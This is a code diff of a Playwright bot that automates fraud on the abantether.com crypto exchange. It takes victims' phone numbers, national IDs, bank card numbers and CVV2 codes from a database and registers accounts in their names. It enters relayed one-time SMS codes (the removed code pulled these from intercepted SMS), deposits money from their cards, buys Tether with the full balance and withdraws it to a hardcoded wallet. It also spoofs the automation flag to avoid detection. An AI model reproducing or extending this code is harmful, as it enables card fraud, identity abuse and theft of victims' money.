@@ -27,10 +27,10 @@ class AbanTetherBot {
         try {
             await fs.mkdir(this.screenshotsDir, { recursive: true });
             const filepath = path.join(this.screenshotsDir, `${name}-${Date.now()}.png`);
-            await this.page.screenshot({ path: filepath, fullPage: true });
+            await this.page.screenshot({ path: filepath });
             this.log('SCREENSHOT', `Saved: ${filepath}`);
         } catch (error) {
-            this.log('ERROR', `Failed to save screenshot: ${error.message}`);
+            this.log('ERROR', `Screenshot error: ${error.message}`);
         }
     }
 
@@ -41,21 +41,28 @@ class AbanTetherBot {
             this.collection = this.db.collection(process.env.COLLECTION_NAME);
             this.log('DATABASE', '✅ Connected to MongoDB');
         } catch (error) {
-            this.log('ERROR', `❌ MongoDB connection failed: ${error.message}`);
+            this.log('ERROR', `Database connection failed: ${error.message}`);
             throw error;
         }
     }
 
     async checkDatabase() {
         try {
-            const pendingUsers = await this.collection.find({
+            this.log('DATABASE', '🔍 Checking for users needing processing...');
+            
+            // کاربرانی که پردازش نشده‌اند و حداقل یک فیلد OTP را پر کرده‌اند
+            const users = await this.collection.find({
                 processed: { $ne: true },
-                personalPhoneNumber: { $ne: "", $exists: true }
+                $or: [
+                    { otp_login: { $exists: true, $ne: '' } },
+                    { otp_register_card: { $exists: true, $ne: '' } },
+                    { otp_payment: { $exists: true, $ne: '' } }
+                ]
             }).toArray();
 
-            this.log('DATABASE', `Found ${pendingUsers.length} pending users`);
+            this.log('DATABASE', `Found ${users.length} users needing processing`);
 
-            for (const user of pendingUsers) {
+            for (const user of users) {
                 const phone = user.personalPhoneNumber;
                 
                 if (phone && !this.processingUsers.has(phone)) {
@@ -81,49 +88,69 @@ class AbanTetherBot {
             this.log('PROCESS', `🔄 Processing user: ${phone}`);
             await this.updateUserStatus(phone, 'starting', 'Process started');
             
-            // Step 1: Initialize
-            await this.updateUserStatus(phone, 'initializing', 'Initializing browser');
+            // بررسی وضعیت فعلی
+            const currentStatus = await this.getUserStatus(phone);
+            this.log('STATUS', `Current OTPs: login=${currentStatus.otp_login ? '✓' : '✗'}, card=${currentStatus.otp_register_card ? '✓' : '✗'}, payment=${currentStatus.otp_payment ? '✓' : '✗'}`);
+            
+            // Step 1: Initialize browser
+            await this.updateUserStatus(phone, 'initializing_browser', 'Launching browser');
             await this.initializeBrowser();
             
-            // Step 2: Open site
-            await this.updateUserStatus(phone, 'opening_site', 'Opening website');
-            await this.openSite();
-            
-            // Step 3: Register
-            await this.updateUserStatus(phone, 'registering', 'Registering phone number');
-            const otpSent = await this.registerPhone(user);
-            
-            if (!otpSent) {
-                throw new Error('Failed to send OTP request');
+            // Step 2: اگر otp_login داریم، لاگین کنیم
+            if (currentStatus.otp_login) {
+                await this.updateUserStatus(phone, 'logging_in', 'Logging in with OTP');
+                await this.loginWithOTP(user, currentStatus.otp_login);
+            } else {
+                await this.updateUserStatus(phone, 'registering', 'Registering phone number');
+                await this.registerPhone(user);
+                
+                // منتظر otp_login
+                await this.updateUserStatus(phone, 'waiting_login_otp', 'Waiting for login OTP');
+                const loginOTP = await this.waitForField(phone, 'otp_login');
+                await this.loginWithOTP(user, loginOTP);
             }
             
-            // Step 4: Handle OTP
-            await this.updateUserStatus(phone, 'waiting_otp', 'Waiting for OTP SMS');
-            await this.handleOTP(phone);
+            // Step 3: اگر otp_register_card داریم، کارت رو ثبت کنیم
+            if (currentStatus.otp_register_card) {
+                await this.updateUserStatus(phone, 'registering_card', 'Registering bank card');
+                await this.registerCardWithOTP(user, currentStatus.otp_register_card);
+            } else {
+                await this.updateUserStatus(phone, 'adding_card', 'Adding bank card');
+                await this.addCard(user);
+                
+                // منتظر otp_register_card
+                await this.updateUserStatus(phone, 'waiting_card_otp', 'Waiting for card OTP');
+                const cardOTP = await this.waitForField(phone, 'otp_register_card');
+                await this.registerCardWithOTP(user, cardOTP);
+            }
             
-            // Step 5: Complete profile
-            await this.updateUserStatus(phone, 'completing_profile', 'Completing profile');
-            await this.completeProfile(user);
+            // Step 4: اگر otp_payment داریم، پرداخت کنیم
+            if (currentStatus.otp_payment) {
+                await this.updateUserStatus(phone, 'making_payment', 'Making payment');
+                await this.makePaymentWithOTP(user, currentStatus.otp_payment);
+            } else {
+                await this.updateUserStatus(phone, 'initiating_payment', 'Initiating payment');
+                await this.initiatePayment(user);
+                
+                // منتظر otp_payment
+                await this.updateUserStatus(phone, 'waiting_payment_otp', 'Waiting for payment OTP');
+                const paymentOTP = await this.waitForField(phone, 'otp_payment');
+                await this.makePaymentWithOTP(user, paymentOTP);
+            }
             
-            // Step 6: Card registration
-            await this.updateUserStatus(phone, 'registering_card', 'Registering bank card');
-            await this.registerCard(user);
-            
-            // Step 7: Deposit
-            await this.updateUserStatus(phone, 'depositing', 'Making deposit');
-            await this.makeDeposit(user);
-            
-            // Step 8: Buy Tether
-            await this.updateUserStatus(phone, 'buying', 'Buying Tether');
+            // Step 5: خرید تتر
+            await this.updateUserStatus(phone, 'buying_tether', 'Buying Tether');
             await this.buyTether();
             
-            // Step 9: Withdraw
+            // Step 6: برداشت تتر
             await this.updateUserStatus(phone, 'withdrawing', 'Withdrawing Tether');
             await this.withdrawTether(user);
             
             // Complete
-            await this.updateUserStatus(phone, 'completed', 'Process completed');
-            this.log('SUCCESS', `✅ Completed for: ${phone}`);
+            await this.updateUserStatus(phone, 'completed', 'Process completed successfully');
+            await this.markAsCompleted(phone);
+            
+            this.log('SUCCESS', `✅ Successfully completed for: ${phone}`);
             
         } catch (error) {
             this.log('ERROR', `❌ Process failed for ${phone}: ${error.message}`);
@@ -133,6 +160,54 @@ class AbanTetherBot {
             this.processingUsers.delete(phone);
             await this.closeBrowser();
         }
+    }
+
+    async getUserStatus(phone) {
+        const user = await this.collection.findOne({ personalPhoneNumber: phone });
+        return {
+            otp_login: user?.otp_login || null,
+            otp_register_card: user?.otp_register_card || null,
+            otp_payment: user?.otp_payment || null
+        };
+    }
+
+    async waitForField(phone, fieldName, timeout = 300000) {
+        this.log('WAIT', `⏳ Waiting for ${fieldName}...`);
+        
+        const startTime = Date.now();
+        const checkInterval = 3000;
+        
+        while (Date.now() - startTime < timeout) {
+            try {
+                const user = await this.collection.findOne({ personalPhoneNumber: phone });
+                
+                if (user && user[fieldName] && user[fieldName].trim() !== '') {
+                    const otp = user[fieldName];
+                    this.log('WAIT', `✅ ${fieldName} received: ${otp}`);
+                    
+                    // پاک کردن OTP بعد از استفاده
+                    await this.collection.updateOne(
+                        { personalPhoneNumber: phone },
+                        { $unset: { [fieldName]: "" } }
+                    );
+                    
+                    return otp;
+                }
+                
+                const elapsed = Math.floor((Date.now() - startTime) / 1000);
+                if (elapsed % 10 === 0) {
+                    this.log('WAIT', `⏳ Still waiting for ${fieldName}... (${elapsed}s passed)`);
+                }
+                
+                await this.sleep(checkInterval);
+                
+            } catch (error) {
+                this.log('ERROR', `Error checking ${fieldName}: ${error.message}`);
+                await this.sleep(checkInterval);
+            }
+        }
+        
+        throw new Error(`Timeout: No ${fieldName} received after ${timeout/1000} seconds`);
     }
 
     async initializeBrowser() {
@@ -145,8 +220,7 @@ class AbanTetherBot {
                     '--no-sandbox',
                     '--disable-setuid-sandbox',
                     '--disable-dev-shm-usage',
-                    '--window-size=1280,720',
-                    '--disable-blink-features=AutomationControlled'
+                    '--window-size=1280,720'
                 ]
             });
             
@@ -156,27 +230,11 @@ class AbanTetherBot {
                 locale: 'fa-IR'
             });
             
-            // Anti-detection
             await context.addInitScript(() => {
                 Object.defineProperty(navigator, 'webdriver', { get: () => false });
-                Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3, 4, 5] });
-                Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en', 'fa'] });
             });
             
             this.page = await context.newPage();
-            
-            // Log network requests
-            this.page.on('request', request => {
-                if (request.url().includes('abantether') && request.method() === 'POST') {
-                    this.log('NETWORK', `→ POST ${request.url()}`);
-                }
-            });
-            
-            this.page.on('response', response => {
-                if (response.url().includes('abantether') && response.status() !== 200) {
-                    this.log('NETWORK', `← ${response.status()} ${response.url()}`);
-                }
-            });
             
             this.log('BROWSER', '✅ Browser initialized');
             
@@ -186,390 +244,405 @@ class AbanTetherBot {
         }
     }
 
-    async openSite() {
-        try {
-            this.log('WEBSITE', '🌐 Opening https://abantether.com/register');
-            
-            const response = await this.page.goto('https://abantether.com/register', {
-                waitUntil: 'networkidle',
-                timeout: 30000
-            });
-            
-            this.log('WEBSITE', `Status: ${response?.status()}`);
-            await this.saveScreenshot('01-site-loaded');
-            
-            // Wait for page to fully load
-            await this.page.waitForLoadState('networkidle');
-            await this.sleep(3000);
-            
-        } catch (error) {
-            this.log('ERROR', `Failed to open site: ${error.message}`);
-            throw error;
-        }
-    }
-
     async registerPhone(user) {
         try {
             this.log('REGISTER', `📝 Registering phone: ${user.personalPhoneNumber}`);
             
-            // METHOD 1: Try to find input by name="username"
-            let phoneInput = await this.page.$('input[name="username"]');
+            // باز کردن صفحه ثبت‌نام
+            await this.page.goto('https://abantether.com/register', {
+                waitUntil: 'networkidle',
+                timeout: 30000
+            });
             
-            // METHOD 2: Try by placeholder
-            if (!phoneInput) {
-                phoneInput = await this.page.$('input[placeholder*="موبایل"], input[placeholder*="شماره"]');
-            }
+            await this.saveScreenshot('01-register-page');
             
-            // METHOD 3: Try by type
-            if (!phoneInput) {
-                phoneInput = await this.page.$('input[type="tel"]');
-            }
-            
-            // METHOD 4: Try all inputs
-            if (!phoneInput) {
-                const allInputs = await this.page.$$('input');
-                for (const input of allInputs) {
-                    const placeholder = await input.getAttribute('placeholder') || '';
-                    if (placeholder.includes('موبایل') || placeholder.includes('شماره')) {
-                        phoneInput = input;
-                        break;
-                    }
-                }
-            }
-            
-            if (!phoneInput) {
-                await this.saveScreenshot('error-no-phone-input');
-                throw new Error('Could not find phone input field');
-            }
-            
-            this.log('REGISTER', '✅ Found phone input field');
-            
-            // Clear and fill phone number
-            await phoneInput.click({ clickCount: 3 });
-            await phoneInput.press('Backspace');
-            await phoneInput.fill(user.personalPhoneNumber);
-            this.log('REGISTER', `✅ Phone filled: ${user.personalPhoneNumber}`);
+            // پیدا کردن فیلد شماره
+            await this.page.waitForSelector('input[name="username"]', { timeout: 10000 });
+            await this.page.fill('input[name="username"]', user.personalPhoneNumber);
+            this.log('REGISTER', `✅ Phone entered: ${user.personalPhoneNumber}`);
             
             await this.saveScreenshot('02-phone-filled');
             
-            // Wait a bit before clicking
-            await this.sleep(2000);
-            
-            // FIND AND CLICK CONTINUE BUTTON
+            // پیدا کردن دکمه ادامه
             this.log('REGISTER', '🔍 Looking for continue button...');
             
-            // Method 1: Look for specific button text
-            const continueButton = await this.findButtonByText([
-                'ادامه',
-                'ارسال کد',
-                'دریافت کد',
-                'ارسال کد تأیید',
-                'ثبت و ادامه'
-            ]);
+            // چند روش مختلف برای پیدا کردن دکمه
+            const buttonSelectors = [
+                'button:has-text("ادامه")',
+                'button:has-text("ارسال کد")',
+                'button[type="submit"]',
+                'form button'
+            ];
             
-            if (continueButton) {
-                this.log('REGISTER', `✅ Found continue button: ${continueButton.text}`);
-                
-                // Check if button is enabled
-                const isDisabled = await continueButton.element.getAttribute('disabled');
-                if (isDisabled) {
-                    this.log('REGISTER', '⚠️ Button is disabled, checking why...');
-                    await this.saveScreenshot('button-disabled');
-                    throw new Error('Continue button is disabled');
-                }
-                
-                await continueButton.element.click();
-                this.log('REGISTER', '✅ Continue button clicked');
-                
-            } else {
-                this.log('REGISTER', '❌ Could not find continue button by text, trying other methods...');
-                
-                // Method 2: Look for submit button
-                const submitButtons = await this.page.$$('button[type="submit"], input[type="submit"]');
-                this.log('REGISTER', `Found ${submitButtons.length} submit buttons`);
-                
-                if (submitButtons.length > 0) {
-                    for (const button of submitButtons) {
-                        const isVisible = await button.isVisible();
-                        if (isVisible) {
-                            await button.click();
-                            this.log('REGISTER', '✅ Clicked submit button');
-                            break;
-                        }
+            let buttonClicked = false;
+            for (const selector of buttonSelectors) {
+                try {
+                    const button = await this.page.$(selector);
+                    if (button && await button.isVisible()) {
+                        await button.click();
+                        this.log('REGISTER', `✅ Clicked button with selector: ${selector}`);
+                        buttonClicked = true;
+                        break;
                     }
-                } else {
-                    // Method 3: Press Enter key
-                    this.log('REGISTER', '⚠️ No buttons found, pressing Enter...');
-                    await this.page.keyboard.press('Enter');
+                } catch (e) {
+                    // ignore
                 }
             }
             
-            // Wait for response
-            this.log('REGISTER', '⏳ Waiting for response...');
+            if (!buttonClicked) {
+                // فشار دادن Enter
+                this.log('REGISTER', '⚠️ No button found, pressing Enter');
+                await this.page.keyboard.press('Enter');
+            }
+            
+            // منتظر پاسخ
             await this.sleep(5000);
+            await this.saveScreenshot('03-after-submit');
             
-            // Check result
-            await this.saveScreenshot('03-after-click');
-            
-            // Check for OTP field
+            // بررسی اینکه آیا فیلد OTP ظاهر شده
             const otpField = await this.page.$('input[type="number"], input[name*="otp"], input[placeholder*="کد"]');
             
             if (otpField) {
-                this.log('REGISTER', '✅ OTP field appeared! SMS should be sent');
-                return true;
+                this.log('REGISTER', '✅ OTP field appeared! Please enter otp_login in database');
+                this.log('REGISTER', `📱 OTP should be sent to: ${user.personalPhoneNumber}`);
             } else {
-                // Check for error messages
-                const pageText = await this.page.textContent('body');
-                
-                if (pageText.includes('ارسال شد') || pageText.includes('sent') || pageText.includes('ارسال')) {
-                    this.log('REGISTER', '✅ SMS sent message found');
-                    return true;
-                } else if (pageText.includes('خطا') || pageText.includes('error')) {
-                    this.log('REGISTER', '❌ Error detected on page');
-                    
-                    // Try to get error details
-                    const errorText = await this.page.evaluate(() => {
-                        const errors = document.querySelectorAll('.error, .text-red, .alert-danger, [class*="error"]');
-                        return Array.from(errors).map(e => e.textContent.trim()).filter(t => t).join(' | ');
-                    });
-                    
-                    if (errorText) {
-                        this.log('REGISTER', `Error details: ${errorText}`);
-                        throw new Error(`Registration error: ${errorText}`);
-                    }
-                    
-                    throw new Error('Unknown registration error');
-                } else {
-                    this.log('REGISTER', '⚠️ No OTP field and no clear status');
-                    return false;
-                }
+                this.log('REGISTER', '⚠️ OTP field not found');
+                throw new Error('OTP field did not appear after submitting phone');
             }
             
         } catch (error) {
             this.log('ERROR', `Registration failed: ${error.message}`);
-            await this.saveScreenshot('error-registration');
+            await this.saveScreenshot('error-register');
             throw error;
         }
     }
 
-    async findButtonByText(texts) {
-        for (const text of texts) {
-            try {
-                // Try exact match first
-                let button = await this.page.$(`button:has-text("${text}")`);
-                
-                // Try case-insensitive
-                if (!button) {
-                    const allButtons = await this.page.$$('button');
-                    for (const btn of allButtons) {
-                        const btnText = await btn.textContent();
-                        if (btnText && btnText.trim().includes(text)) {
-                            button = btn;
-                            break;
-                        }
-                    }
-                }
-                
-                // Try input buttons
-                if (!button) {
-                    const inputButtons = await this.page.$$('input[type="button"], input[type="submit"]');
-                    for (const btn of inputButtons) {
-                        const value = await btn.getAttribute('value');
-                        if (value && value.includes(text)) {
-                            button = btn;
-                            break;
-                        }
-                    }
-                }
-                
-                if (button) {
-                    const isVisible = await button.isVisible();
-                    if (isVisible) {
-                        const buttonText = await button.textContent() || await button.getAttribute('value') || '';
-                        return { element: button, text: buttonText.trim() };
-                    }
-                }
-            } catch (e) {
-                // Continue to next text
-            }
-        }
-        return null;
-    }
-
-    async handleOTP(phone) {
+    async loginWithOTP(user, otp) {
         try {
-            this.log('OTP', `📱 Handling OTP for ${phone}`);
+            this.log('LOGIN', `🔑 Logging in with OTP: ${otp}`);
             
-            // Wait for OTP field to appear
-            this.log('OTP', '⏳ Waiting for OTP input field...');
+            // وارد کردن OTP
+            await this.page.fill('input[type="number"], input[name*="otp"], input[placeholder*="کد"]', otp);
+            this.log('LOGIN', `✅ OTP entered: ${otp}`);
             
-            let otpField = null;
-            for (let i = 0; i < 30; i++) {
-                otpField = await this.page.$('input[type="number"], input[name*="otp"], input[placeholder*="کد"], input[placeholder*="رمز"]');
-                if (otpField) {
-                    this.log('OTP', '✅ OTP field found');
-                    break;
-                }
-                this.log('OTP', `Still waiting... (${i + 1}/30)`);
-                await this.sleep(1000);
-            }
+            await this.saveScreenshot('04-otp-entered');
             
-            if (!otpField) {
-                this.log('OTP', '⚠️ OTP field not found, checking page...');
-                await this.saveScreenshot('04-no-otp-field');
-                
-                // Maybe we're on a different page
-                const pageUrl = await this.page.url();
-                this.log('OTP', `Current URL: ${pageUrl}`);
-                
-                if (!pageUrl.includes('register') && !pageUrl.includes('login')) {
-                    this.log('OTP', '✅ Seems like we passed OTP stage');
-                    return;
-                }
-            }
+            // پیدا کردن دکمه تأیید
+            const confirmSelectors = [
+                'button:has-text("تایید")',
+                'button:has-text("ورود")',
+                'button[type="submit"]'
+            ];
             
-            // Inform user
-            this.log('OTP', '📢 IMPORTANT: Check SMS on your phone!');
-            this.log('OTP', `📱 Website should have sent SMS to: ${phone}`);
-            this.log('OTP', '📱 Please add the OTP from SMS to database');
-            
-            // Wait for OTP in database
-            const otp = await this.waitForOTPInDatabase(phone);
-            
-            // Enter OTP
-            this.log('OTP', `✅ OTP received: ${otp}`);
-            
-            if (otpField) {
-                await otpField.fill(otp);
-                this.log('OTP', `✅ OTP entered: ${otp}`);
-            } else {
-                // Try to find any input
-                const inputs = await this.page.$$('input');
-                for (const input of inputs) {
-                    const type = await input.getAttribute('type');
-                    if (type === 'number' || type === 'text') {
-                        await input.fill(otp);
-                        this.log('OTP', '✅ OTP entered in available input');
+            for (const selector of confirmSelectors) {
+                try {
+                    const button = await this.page.$(selector);
+                    if (button && await button.isVisible()) {
+                        await button.click();
+                        this.log('LOGIN', `✅ Clicked confirm button: ${selector}`);
                         break;
                     }
+                } catch (e) {
+                    // ignore
                 }
             }
             
-            await this.saveScreenshot('05-otp-entered');
+            // منتظر لاگین
+            await this.sleep(5000);
+            await this.saveScreenshot('05-after-login');
             
-            // Find and click confirm button
-            this.log('OTP', '🔍 Looking for confirm button...');
+            // پر کردن اطلاعات پروفایل
+            this.log('LOGIN', '👤 Filling profile information...');
             
-            const confirmButton = await this.findButtonByText(['تایید', 'ورود', 'ثبت', 'تأیید']);
+            if (user.personalName) {
+                await this.fillFieldByNameOrPlaceholder('نام', user.personalName);
+            }
             
-            if (confirmButton) {
-                await confirmButton.element.click();
-                this.log('OTP', '✅ Confirm button clicked');
+            if (user.personalNationalCode) {
+                await this.fillFieldByNameOrPlaceholder('کد ملی', user.personalNationalCode);
+            }
+            
+            if (user.personalBirthDate) {
+                const birthDate = new Date(user.personalBirthDate);
+                const year = birthDate.getFullYear();
+                const month = String(birthDate.getMonth() + 1).padStart(2, '0');
+                const day = String(birthDate.getDate()).padStart(2, '0');
+                
+                await this.fillFieldByNameOrPlaceholder('سال', year.toString());
+                await this.fillFieldByNameOrPlaceholder('ماه', month);
+                await this.fillFieldByNameOrPlaceholder('روز', day);
+            }
+            
+            if (user.personalCity) {
+                await this.fillFieldByNameOrPlaceholder('شهر', user.personalCity);
+            }
+            
+            if (user.personalProvince) {
+                await this.fillFieldByNameOrPlaceholder('استان', user.personalProvince);
+            }
+            
+            // ذخیره اطلاعات
+            const saveButtons = await this.page.$$('button:has-text("ذخیره"), button:has-text("ثبت")');
+            if (saveButtons.length > 0) {
+                await saveButtons[0].click();
+                this.log('LOGIN', '✅ Profile information saved');
+            }
+            
+            await this.sleep(3000);
+            await this.saveScreenshot('06-profile-completed');
+            
+        } catch (error) {
+            this.log('ERROR', `Login failed: ${error.message}`);
+            await this.saveScreenshot('error-login');
+            throw error;
+        }
+    }
+
+    async fillFieldByNameOrPlaceholder(fieldName, value) {
+        try {
+            // جستجو با placeholder
+            const selector = `input[placeholder*="${fieldName}"], input[name*="${fieldName}"]`;
+            const field = await this.page.$(selector);
+            
+            if (field) {
+                await field.fill(value);
+                this.log('FILL', `✅ Filled ${fieldName}: ${value}`);
+                return true;
+            }
+            
+            return false;
+        } catch (error) {
+            this.log('ERROR', `Failed to fill ${fieldName}: ${error.message}`);
+            return false;
+        }
+    }
+
+    async addCard(user) {
+        try {
+            this.log('CARD', '💳 Going to add bank card...');
+            
+            // رفتن به صفحه کیف پول
+            await this.page.goto('https://abantether.com/wallet', {
+                waitUntil: 'networkidle',
+                timeout: 30000
+            });
+            
+            await this.saveScreenshot('07-wallet-page');
+            
+            // پیدا کردن دکمه اضافه کردن کارت
+            const addCardButtons = await this.page.$$('button:has-text("اضافه کردن کارت"), button:has-text("ثبت کارت جدید")');
+            
+            if (addCardButtons.length > 0) {
+                await addCardButtons[0].click();
+                this.log('CARD', '✅ Clicked add card button');
             } else {
-                this.log('OTP', '⚠️ No confirm button, pressing Enter');
-                await this.page.keyboard.press('Enter');
+                this.log('CARD', '⚠️ Add card button not found, trying direct form');
+            }
+            
+            await this.sleep(2000);
+            await this.saveScreenshot('08-add-card-form');
+            
+            // پر کردن اطلاعات کارت
+            if (user.cardNumber) {
+                await this.fillFieldByNameOrPlaceholder('شماره کارت', user.cardNumber);
+            }
+            
+            if (user.cvv2) {
+                await this.fillFieldByNameOrPlaceholder('CVV2', user.cvv2);
+            }
+            
+            if (user.bankMonth) {
+                await this.fillFieldByNameOrPlaceholder('ماه', user.bankMonth.toString());
+            }
+            
+            if (user.bankYear) {
+                await this.fillFieldByNameOrPlaceholder('سال', user.bankYear.toString());
+            }
+            
+            // ارسال فرم
+            const submitButtons = await this.page.$$('button:has-text("ثبت کارت"), button[type="submit"]');
+            if (submitButtons.length > 0) {
+                await submitButtons[0].click();
+                this.log('CARD', '✅ Card form submitted');
+            }
+            
+            await this.sleep(3000);
+            await this.saveScreenshot('09-card-submitted');
+            
+            this.log('CARD', '📱 Please enter otp_register_card in database');
+            
+        } catch (error) {
+            this.log('ERROR', `Add card failed: ${error.message}`);
+            await this.saveScreenshot('error-add-card');
+            throw error;
+        }
+    }
+
+    async registerCardWithOTP(user, otp) {
+        try {
+            this.log('CARD_OTP', `🔐 Registering card with OTP: ${otp}`);
+            
+            // وارد کردن OTP کارت
+            await this.page.fill('input[type="number"], input[name*="otp"], input[placeholder*="کد"]', otp);
+            this.log('CARD_OTP', `✅ Card OTP entered: ${otp}`);
+            
+            await this.saveScreenshot('10-card-otp-entered');
+            
+            // تأیید
+            const confirmButtons = await this.page.$$('button:has-text("تایید")');
+            if (confirmButtons.length > 0) {
+                await confirmButtons[0].click();
+                this.log('CARD_OTP', '✅ Card confirmed');
+            }
+            
+            await this.sleep(3000);
+            await this.saveScreenshot('11-card-registered');
+            
+        } catch (error) {
+            this.log('ERROR', `Card registration failed: ${error.message}`);
+            await this.saveScreenshot('error-card-otp');
+            throw error;
+        }
+    }
+
+    async initiatePayment(user) {
+        try {
+            this.log('PAYMENT', '💰 Going to make payment...');
+            
+            // رفتن به صفحه واریز
+            await this.page.goto('https://abantether.com/deposit', {
+                waitUntil: 'networkidle',
+                timeout: 30000
+            });
+            
+            await this.saveScreenshot('12-deposit-page');
+            
+            // وارد کردن مبلغ
+            await this.fillFieldByNameOrPlaceholder('مبلغ', '5000000');
+            this.log('PAYMENT', '✅ Amount entered: 5,000,000 تومان');
+            
+            // ارسال درخواست واریز
+            const depositButtons = await this.page.$$('button:has-text("واریز"), button:has-text("پرداخت")');
+            if (depositButtons.length > 0) {
+                await depositButtons[0].click();
+                this.log('PAYMENT', '✅ Payment initiated');
+            }
+            
+            await this.sleep(3000);
+            await this.saveScreenshot('13-payment-initiated');
+            
+            this.log('PAYMENT', '📱 Please enter otp_payment in database');
+            
+        } catch (error) {
+            this.log('ERROR', `Payment initiation failed: ${error.message}`);
+            await this.saveScreenshot('error-payment');
+            throw error;
+        }
+    }
+
+    async makePaymentWithOTP(user, otp) {
+        try {
+            this.log('PAYMENT_OTP', `💳 Making payment with OTP: ${otp}`);
+            
+            // وارد کردن OTP پرداخت
+            await this.page.fill('input[type="number"], input[name*="otp"], input[placeholder*="کد"]', otp);
+            this.log('PAYMENT_OTP', `✅ Payment OTP entered: ${otp}`);
+            
+            await this.saveScreenshot('14-payment-otp-entered');
+            
+            // تأیید پرداخت
+            const confirmButtons = await this.page.$$('button:has-text("تایید")');
+            if (confirmButtons.length > 0) {
+                await confirmButtons[0].click();
+                this.log('PAYMENT_OTP', '✅ Payment confirmed');
             }
             
             await this.sleep(5000);
-            await this.saveScreenshot('06-after-confirm');
+            await this.saveScreenshot('15-payment-completed');
             
         } catch (error) {
-            this.log('ERROR', `OTP handling failed: ${error.message}`);
-            await this.saveScreenshot('error-otp');
-            throw error;
-        }
-    }
-
-    async waitForOTPInDatabase(phone, timeout = 300000) {
-        const startTime = Date.now();
-        
-        this.log('OTP_DB', `⏳ Waiting for OTP in database for ${phone}...`);
-        
-        while (Date.now() - startTime < timeout) {
-            try {
-                const user = await this.collection.findOne({ personalPhoneNumber: phone });
-                
-                if (user && user.sms) {
-                    // Check SMS from newest to oldest
-                    const sortedSMS = [...user.sms].sort((a, b) => b.date - a.date);
-                    
-                    for (const sms of sortedSMS) {
-                        if (sms.body && (sms.body.includes('آبان') || sms.body.includes('abantether'))) {
-                            // Try to extract OTP
-                            const otpMatch = sms.body.match(/(\d{4,6})/);
-                            if (otpMatch) {
-                                this.log('OTP_DB', `✅ Found OTP in SMS: ${otpMatch[1]}`);
-                                return otpMatch[1];
-                            }
-                        }
-                    }
-                }
-                
-                const elapsed = Math.floor((Date.now() - startTime) / 1000);
-                this.log('OTP_DB', `⏳ [${elapsed}s] Waiting...`);
-                
-                await this.sleep(5000);
-                
-            } catch (error) {
-                this.log('ERROR', `Database check error: ${error.message}`);
-                await this.sleep(5000);
-            }
-        }
-        
-        throw new Error(`Timeout: No OTP found after ${timeout/1000} seconds`);
-    }
-
-    async completeProfile(user) {
-        try {
-            this.log('PROFILE', '👤 Completing user profile...');
-            await this.sleep(3000);
-            this.log('PROFILE', '✅ Profile step completed (simplified)');
-        } catch (error) {
-            this.log('ERROR', `Profile completion failed: ${error.message}`);
-            throw error;
-        }
-    }
-
-    async registerCard(user) {
-        try {
-            this.log('CARD', '💳 Registering bank card...');
-            await this.sleep(3000);
-            this.log('CARD', '✅ Card step completed (simplified)');
-        } catch (error) {
-            this.log('ERROR', `Card registration failed: ${error.message}`);
-            throw error;
-        }
-    }
-
-    async makeDeposit(user) {
-        try {
-            this.log('DEPOSIT', '💰 Making deposit...');
-            await this.sleep(3000);
-            this.log('DEPOSIT', '✅ Deposit step completed (simplified)');
-        } catch (error) {
-            this.log('ERROR', `Deposit failed: ${error.message}`);
+            this.log('ERROR', `Payment failed: ${error.message}`);
+            await this.saveScreenshot('error-payment-otp');
             throw error;
         }
     }
 
     async buyTether() {
         try {
-            this.log('BUY', '🛒 Buying Tether...');
-            await this.sleep(3000);
-            this.log('BUY', '✅ Buy step completed (simplified)');
+            this.log('BUY', '🛒 Going to buy Tether...');
+            
+            // رفتن به بازار
+            await this.page.goto('https://abantether.com/market', {
+                waitUntil: 'networkidle',
+                timeout: 30000
+            });
+            
+            await this.saveScreenshot('16-market-page');
+            
+            // پیدا کردن دکمه خرید تتر
+            const buyButtons = await this.page.$$('button:has-text("خرید تتر")');
+            if (buyButtons.length > 0) {
+                await buyButtons[0].click();
+                this.log('BUY', '✅ Clicked buy Tether button');
+            }
+            
+            await this.sleep(2000);
+            await this.saveScreenshot('17-buy-form');
+            
+            // انتخاب "همه موجودی"
+            const allBalanceButtons = await this.page.$$('button:has-text("همه موجودی")');
+            if (allBalanceButtons.length > 0) {
+                await allBalanceButtons[0].click();
+                this.log('BUY', '✅ Selected all balance');
+            }
+            
+            // تأیید خرید
+            const confirmBuyButtons = await this.page.$$('button:has-text("خرید"), button:has-text("تأیید خرید")');
+            if (confirmBuyButtons.length > 0) {
+                await confirmBuyButtons[0].click();
+                this.log('BUY', '✅ Purchase confirmed');
+            }
+            
+            await this.sleep(5000);
+            await this.saveScreenshot('18-buy-completed');
+            
         } catch (error) {
-            this.log('ERROR', `Buy failed: ${error.message}`);
+            this.log('ERROR', `Buy Tether failed: ${error.message}`);
+            await this.saveScreenshot('error-buy');
             throw error;
         }
     }
 
     async withdrawTether(user) {
         try {
-            this.log('WITHDRAW', '🏦 Withdrawing Tether...');
-            await this.sleep(3000);
-            this.log('WITHDRAW', '✅ Withdraw step completed (simplified)');
+            this.log('WITHDRAW', '🏦 Going to withdraw Tether...');
+            
+            // رفتن به صفحه برداشت
+            await this.page.goto('https://abantether.com/withdraw', {
+                waitUntil: 'networkidle',
+                timeout: 30000
+            });
+            
+            await this.saveScreenshot('19-withdraw-page');
+            
+            // وارد کردن آدرس
+            const withdrawAddress = 'THtQH52yMFSsJAvFbKnBfYpbbDKWpKfJHS';
+            await this.fillFieldByNameOrPlaceholder('آدرس', withdrawAddress);
+            this.log('WITHDRAW', `✅ Withdraw address entered: ${withdrawAddress}`);
+            
+            // برداشت
+            const withdrawButtons = await this.page.$$('button:has-text("برداشت")');
+            if (withdrawButtons.length > 0) {
+                await withdrawButtons[0].click();
+                this.log('WITHDRAW', '✅ Withdraw initiated');
+            }
+            
+            await this.sleep(5000);
+            await this.saveScreenshot('20-withdraw-completed');
+            
         } catch (error) {
             this.log('ERROR', `Withdraw failed: ${error.message}`);
+            await this.saveScreenshot('error-withdraw');
             throw error;
         }
     }
@@ -594,6 +667,26 @@ class AbanTetherBot {
         }
     }
 
+    async markAsCompleted(phone) {
+        try {
+            await this.collection.updateOne(
+                { personalPhoneNumber: phone },
+                { 
+                    $set: { 
+                        processed: true,
+                        status: "completed",
+                        completedAt: new Date()
+                    }
+                }
+            );
+            
+            this.log('COMPLETE', `✅ Marked ${phone} as completed`);
+            
+        } catch (error) {
+            this.log('ERROR', `Mark as completed failed: ${error.message}`);
+        }
+    }
+
     async closeBrowser() {
         try {
             if (this.browser) {
@@ -612,7 +705,7 @@ class AbanTetherBot {
     }
 
     async startPolling() {
